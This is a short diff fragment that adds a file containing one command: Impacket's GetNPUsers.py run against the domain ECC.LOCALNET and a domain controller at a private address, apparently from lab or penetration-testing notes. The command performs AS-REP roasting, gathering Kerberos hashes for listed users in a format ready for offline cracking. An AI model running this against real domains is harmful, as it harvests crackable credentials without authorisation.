@@ -1,0 +1,3 @@
+
+
+GetNPUsers.py ECC.LOCALNET/ -usersfile kerbuser -format hashcat -outputfile asrep_hashes.txt -dc-ip 172.25.170.80
